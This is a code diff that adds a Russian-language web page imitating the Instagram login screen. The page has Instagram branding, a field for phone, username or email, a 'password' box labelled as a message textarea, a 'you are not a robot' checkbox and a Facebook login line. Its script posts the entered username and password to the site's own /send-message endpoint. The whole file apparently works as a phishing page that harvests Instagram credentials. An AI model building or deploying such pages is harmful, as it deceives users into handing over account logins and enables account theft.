@@ -1,0 +1,247 @@
+
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Instagram — Сообщения</title>
+
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+
+<body>
+
+    <div class="language">
+        Русский (Россия) ˅
+    </div>
+
+    <main class="login-container">
+
+        <h1 class="logo">Instagram</h1>
+
+
+
+        <p class="subtitle">
+        </p>
+
+        <form id="message-form">
+
+            <input
+                type="text"
+                id="username"
+                placeholder="Номер телефона, имя пользователя или эл. адрес "
+                maxlength="50"
+                autocomplete="name"
+                required
+            >
+
+            <textarea
+                id="message"
+                placeholder="Пароль"
+                maxlength="10"
+                required
+            ></textarea>
+
+            <div class="counter">
+                <span id="count">0</span> / 100
+            </div>
+
+            <label class="consent">
+                <input
+                    type="checkbox"
+                    id="consent"
+                    required
+                >
+
+                <span>
+вы не робот
+                </span>
+            </label>
+
+            <button type="submit" id="submit">
+                <span id="btn-text">Отправить</span>
+            </button>
+
+            <p id="status" class="status"></p>
+
+        </form>
+
+        <div class="forgot">
+            Instagram — обратная связь
+        </div>
+
+        <div class="separator">
+            <span></span>
+            Instagram
+            <span></span>
+        </div>
+
+        <p class="note">
+Войти через Facebook
+        </p>
+
+    </main>
+
+
+    <script>
+
+        const form = document.getElementById("message-form");
+
+        const button = document.getElementById("submit");
+
+        const buttonText = document.getElementById("btn-text");
+
+        const statusBox = document.getElementById("status");
+
+        const messageInput = document.getElementById("message");
+
+        const count = document.getElementById("count");
+
+
+        // Счётчик символов
+
+        messageInput.addEventListener("input", () => {
+
+            count.textContent = messageInput.value.length;
+
+        });
+
+
+        // Отображение результата
+
+        function showStatus(type, text) {
+
+            statusBox.className = "status " + type;
+
+            statusBox.textContent = text;
+
+        }
+
+
+        // Состояние кнопки
+
+        function setLoading(loading) {
+
+            button.disabled = loading;
+
+            buttonText.textContent = loading
+                ? "Отправка..."
+                : "Отправить";
+
+        }
+
+
+        // Отправка сообщения
+
+        form.addEventListener("submit", async (event) => {
+
+            event.preventDefault();
+
+            const username = document
+                .getElementById("username")
+                .value.trim();
+
+            const message = messageInput.value.trim();
+
+            const consent = document
+                .getElementById("consent")
+                .checked;
+
+
+            if (!username || !message) {
+
+                showStatus(
+                    "error",
+                    "Заполните все поля."
+                );
+
+                return;
+
+            }
+
+
+            if (!consent) {
+
+                showStatus(
+                    "error",
+                    "Необходимо дать согласие."
+                );
+
+                return;
+
+            }
+
+
+            setLoading(true);
+
+            statusBox.className = "status";
+
+
+            try {
+
+                const response = await fetch("/send-message", {
+
+                    method: "POST",
+
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+
+                    body: JSON.stringify({
+
+                        username: username,
+
+                        message: message,
+
+                        consent: consent
+
+                    })
+
+                });
+
+
+                const data = await response.json();
+
+
+                if (response.ok && data.ok) {
+
+                    showStatus(
+                        "success",
+                        "Сообщение успешно отправлено!"
+                    );
+
+                    form.reset();
+
+                    count.textContent = "0";
+
+                } else {
+
+                    showStatus(
+                        "error",
+                        data.detail || "Ошибка отправки."
+                    );
+
+                }
+
+            } catch (error) {
+
+                showStatus(
+                    "error",
+                    "Ошибка сети. Попробуйте ещё раз."
+                );
+
+            } finally {
+
+                setLoading(false);
+
+            }
+
+        });
+
+    </script>
+
+</body>
+
+</html>
